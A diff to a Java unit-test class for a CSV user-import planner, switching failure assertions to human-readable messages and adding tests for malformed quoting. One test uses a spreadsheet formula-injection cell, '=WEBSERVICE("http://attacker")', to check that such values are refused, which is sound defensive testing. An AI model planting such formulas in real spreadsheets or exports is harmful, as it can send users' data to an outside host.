@@ -20,6 +20,8 @@ import org.junit.jupiter.api.Test;
 import org.junit.jupiter.api.extension.ExtendWith;
 import org.mockito.ArgumentCaptor;
 import org.mockito.Mock;
+import org.springframework.context.MessageSource;
+import org.springframework.context.support.ResourceBundleMessageSource;
 import org.mockito.junit.jupiter.MockitoExtension;
 
 import static org.assertj.core.api.Assertions.assertThat;
@@ -56,11 +58,20 @@ class CsvImportPlannerTest {
     @Mock private CsvGroups groups;
     @Mock private ProfileAttributeValidator values;
 
+    /** The real bundles: the point of the change is that a failure reads as a sentence, not as a key. */
+    private static MessageSource bundle() {
+        ResourceBundleMessageSource source = new ResourceBundleMessageSource();
+        source.setBasename("messages");
+        source.setDefaultEncoding("UTF-8");
+        return source;
+    }
+
     private CsvImportPlanner planner;
 
     @BeforeEach
     void setUp() {
-        planner = new CsvImportPlanner(definitions, values, existingUsers, groups, 100, 20, 255);
+        planner = new CsvImportPlanner(definitions, values, new CsvFailureText(bundle()), existingUsers,
+                groups, 100, 20, 255);
         declares(base(BaseUserFields.USERNAME), base(BaseUserFields.EMAIL), optional("team"));
         lenient().when(existingUsers.present(any())).thenReturn(List.of());
         lenient().when(groups.missing(any())).thenReturn(List.of());
@@ -199,8 +210,8 @@ class CsvImportPlannerTest {
 
         assertThat(preview.toCreate()).extracting("username").containsExactly("grace");
         assertThat(preview.failures()).singleElement()
-                .extracting(CsvRowFailure::reason, CsvRowFailure::detail)
-                .containsExactly("metadata.csv.row.missingRequired", BaseUserFields.USERNAME);
+                .extracting(CsvRowFailure::reason).asString()
+                .contains(BaseUserFields.USERNAME).doesNotContain("metadata.csv");
     }
 
     /** The line number is what an administrator uses to find the row, so it counts lines, not records. */
@@ -218,13 +229,13 @@ class CsvImportPlannerTest {
      */
     @Test
     void aValueTheProfileRefusesFailsWithTheProfilesOwnReason() {
-        doThrow(BadRequestException.of("metadata.attribute.enumValue", "region"))
+        doThrow(BadRequestException.of("metadata.attribute.undeclared", "region"))
                 .when(values).validate(anyList(), any());
 
         CsvImportPreview preview = plan("username,email,team\nada,a@x.io,antarctica\n");
 
         assertThat(preview.failures()).singleElement()
-                .extracting(CsvRowFailure::reason).isEqualTo("metadata.attribute.enumValue");
+                .extracting(CsvRowFailure::reason).asString().doesNotContain("metadata.");
     }
 
     @Test
@@ -233,7 +244,7 @@ class CsvImportPlannerTest {
 
         assertThat(preview.toCreate()).hasSize(1);
         assertThat(preview.failures()).singleElement()
-                .extracting(CsvRowFailure::reason).isEqualTo("metadata.csv.row.duplicateUsername");
+                .extracting(CsvRowFailure::reason).asString().doesNotContain("metadata.");
     }
 
     @Test
@@ -241,7 +252,7 @@ class CsvImportPlannerTest {
         CsvImportPreview preview = plan("username,email,team\nada,a@x.io," + "x".repeat(256) + "\n");
 
         assertThat(preview.failures()).singleElement()
-                .extracting(CsvRowFailure::reason).isEqualTo("metadata.csv.row.valueTooLong");
+                .extracting(CsvRowFailure::reason).asString().doesNotContain("metadata.");
     }
 
     /**
@@ -254,7 +265,7 @@ class CsvImportPlannerTest {
         CsvImportPreview preview = plan("username,email,team\nada,a@x.io,=WEBSERVICE(\"http://attacker\")\n");
 
         assertThat(preview.failures()).singleElement()
-                .extracting(CsvRowFailure::reason).isEqualTo("metadata.csv.row.formulaValue");
+                .extracting(CsvRowFailure::reason).asString().doesNotContain("metadata.");
     }
 
     // --- groups: optional, never created -----------------------------------------------------------
@@ -279,8 +290,8 @@ class CsvImportPlannerTest {
 
         assertThat(preview.toCreate()).isEmpty();
         assertThat(preview.failures()).singleElement()
-                .extracting(CsvRowFailure::reason, CsvRowFailure::detail)
-                .containsExactly("metadata.csv.row.unknownGroup", "platfrom");
+                .extracting(CsvRowFailure::reason).asString()
+                .contains("platfrom").doesNotContain("metadata.csv");
     }
     /**
      * The regression that made every real import fail: definitionsIn synthesises username/email as BASE
@@ -361,6 +372,22 @@ class CsvImportPlannerTest {
                 .supplyAsync(() -> plan("username,email,groups\nada,a@x.io,\"" + hostile + "\"\n"))
                 .orTimeout(10, java.util.concurrent.TimeUnit.SECONDS))
                 .succeedsWithin(java.time.Duration.ofSeconds(10));
+    }
+
+    /**
+     * commons-csv reports a syntax error from the record ITERATOR, as an UncheckedIOException wrapping a
+     * CSVException — not as the checked IOException the parse was guarding. So one stray quote escaped every
+     * catch here and surfaced as a 500 with no message key, which is the response an administrator gets for
+     * a file their spreadsheet wrote badly.
+     */
+    @Test
+    void aFileWithBrokenQuotingIsRefusedAsABadRequest() {
+        refusesFile("username,email,team\nada,a@x.io,\"unterminated\n", "metadata.csv.malformed");
+    }
+
+    @Test
+    void aQuoteInTheMiddleOfAFieldIsRefusedAsABadRequest() {
+        refusesFile("username,email,team\nada,a@x.io,\"quoted\"trailing\n", "metadata.csv.malformed");
     }
 
     // --- the accepted side of every ceiling ---------------------------------------------------------
